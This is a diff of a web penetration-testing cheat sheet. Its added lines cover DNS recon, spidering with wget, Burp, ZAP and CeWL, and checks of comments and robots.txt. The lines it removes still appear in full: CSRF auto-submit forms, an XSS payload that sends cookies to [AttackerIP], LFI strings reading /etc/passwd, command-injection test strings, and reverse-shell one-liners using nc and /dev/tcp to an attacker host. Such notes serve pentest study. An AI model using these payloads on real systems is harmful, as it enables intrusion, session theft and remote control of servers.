@@ -34,7 +34,7 @@ dig @[DNSServerIP] version.bind chaos txt
 # locate .nse | grep DNS to find scripts
 # less the script and look at args and usage
 # use DNSRecon list as well /dnsrecon/namelist.txt
-nmap --script=dns-brute site.org
+nmap --script=dns-brute www.site.org 
 nmap -sl 192.168.1.0/24 | grep \)
 
 # domain list is much larger than nmap
@@ -49,6 +49,7 @@ auiliary/gather/dns_reverse_lookup
 auiliary/gather/dns_srv_enum
 {% endhighlight %}
 
+Note:  Keep a running list of DNS information discovered
 
 > **Open Source Information**
 
@@ -121,6 +122,8 @@ recon/location-pushpins/youtube
 
 {% highlight bash %}
 nmap -p80 --script http-useragent-tester.nse [host]
+
+#User Agent Strings	http://www.useragentstring.com/index.php?id=19732
 {% endhighlight %}
 
 
@@ -146,6 +149,7 @@ SSLLabs
 # known vulnerabilities
 # Technologies versions to customize attacks (OS, platform, web server) such as case sensativity
 # Supported methods (Put, Delete)
+# Default pages 
 # Ports and Services
 
 #NMAP
@@ -165,158 +169,52 @@ toolbar.netcraft.com/site_report
 https://wappalizer.com
 {% endhighlight %}
 
-
-
-
-
-
-
-
-
-> **CSRF**
-
-GET:
-{% highlight html %}
-<img src="http://<ip_of_site>/form.php?<parameter>=<value>
-{% endhighlight %}
-
-POST:
-{% highlight html %}
-<form  ID=CSRF action="<website>" method="POST">
-<input type="hidden" name="<paramater>" value="<value>"/>
-<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
-       tabindex="-1"/>
-</form>
-<script>document.getElementById('CSRF').submit();</script>
-{% endhighlight %}
-
-> **XSS**
-
-Get Cookie:
-{% highlight html %}
-<script>document.location='http://[AttackerIP]/cgi-bin/grab.cgi?'+docment.cookie;</script>
-{% endhighlight %}
-
-POST:
-{% highlight html %}
-<form  ID=CSRF action="<website>" method="POST">
-<input type="hidden" name="<paramater>" value="<value>"/>
-<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
-       tabindex="-1"/>
-</form>
-<script>document.getElementById('CSRF').submit();</script>
-{% endhighlight %}
-
-
-
-> **XSS Test Strings**
-
-{% highlight html %}
-'';!--"<XSS>=&{()}
-{% endhighlight %}
-
-{% highlight html %}
-<script>alert(document.cookie);</script>
-
-<script type="text/vbscript">alert(DOCUMENT.COOKIE)</script>
-
-<script src=http://www.example.com/malicious-code.js></script>
-
-%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e
-
-\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
-
->"><script>alert("XSS")</script>&
-
-"><STYLE>@import"javascript:alert('XSS')";</STYLE>
-
-<IMG SRC="javascript:alert('XSS');">
-
-<IMG SRC=javascript:alert('XSS')>
-
-<IMG SRC=JaVaScRiPt:alert('XSS')> 
-
-<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
-
-<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
-
-<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
-
-<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
-
-{% endhighlight %}
-
-
-
-> **Local File Include**
+> **Spidering and Comments**
 
 {% highlight bash %}
-#Automated Tool
-fimap -u 'http://website/?p=file.html'
+#WGET 
+wget -r http://www.sec542.org -l 3
 
-#Test for Local File Include
-http://website/?p=file%3a%2f%2f%2fetc%2fpasswd
+#Burp
+1. Browse to site while proxied 
+2. Click on Spider Tab and verify options
+3. Target -> Site Map -> Right click -> spider this host
 
-#Grab data
-http://website/?p=php://filter/convert.base64-encode/resource=/etc/php/7.0/apache2/php.ini
-http://utilities.snrt.io/?p=php://filter/convert.base64-encode/resource=index.php
+#ZAP
+1. Browse to site while proxied 
+2. Right click -> attack -> Spider
+3. For javascript: Right click -> attack -> AJAX Spider"
 
-#Rebuild Base64 file (e.g.,executable)
-base64 -d extractedBase64File > executable2
-curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=index" | base64 -d
+# CeWL - Creates a Custom Word List from Site for usernames and passwords
+cewl http://www.sec542.org
 
+#w3af - Creates a visual site map
 {% endhighlight %}
 
-> **Command Injection**
-{% highlight bash %}
-#Commix Automated Tool
-commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument" 
-python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"
-
-
-#Test Strings
-test`pwd`
-test$(pwd)
-test; pwd
-test | pwd
-test && pwd
-{% endhighlight %}
-
-> **Blind Command Injection**
+>  **Comments and Robots.txt**
 
 {% highlight bash %}
-#Attacker Machine
-tcpdump -n host <webserver IP> and ICMP
-nc -l [port]
-#Victim
-test; ping -c 4 <yourAttackerIP>; echo hello 
-test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello
-#Alternative to NC for non-debian based distrobutions
-/bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 
+#Look for:
+# -useful/sensitive code/links/urls
+# -disabled functions
+# -linked servers (contant and application servers)
+# -passwords
+# -other interesting information
 
-#Sleep method
-http://ci.example.org/blind.php?address=127.0.0.1 && sleep 10
+#NMAP Comments	
+nmap --script=http-comments-displayer www.sec542.org
+
+#Burp Comments, Scripts, References	
+1. Right click -> Engagement tools -> Find Comments, Scripts, or References
+
+#NMAP Robots	
+nmap --script =http-robots.txt www.sec542.org
 {% endhighlight %}
-
-> **Web Shells**
-
-Kali: 
-
-PHP | <code> /usr/share/webshells/php/ </code>
-PERL | <code> /usr/share/webshells/perl/ </code>
-Cold Fusion | <code> /usr/share/webshells/cfm/ </code>
-ASP | <code> /usr/share/webshells/asp/ </code>
-ASPX | <code> /usr/share/webshells/aspx/ </code>
-JSP | <code> /usr/share/webshells/jsp/jsp-reverse.jsp </code>
-
-Online:
-
-* [PHP and Perl](http://pentestmonkey.net/category/tools/web-shells)
-* [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 
 > **Useful Resources**
 
-* [MongoDB](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
+* [User Agent Strings](http://www.useragentstring.com/index.php?id=19732) 
+
 * [Command Injection](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
 * [Fuzzing List](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
 * [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors)
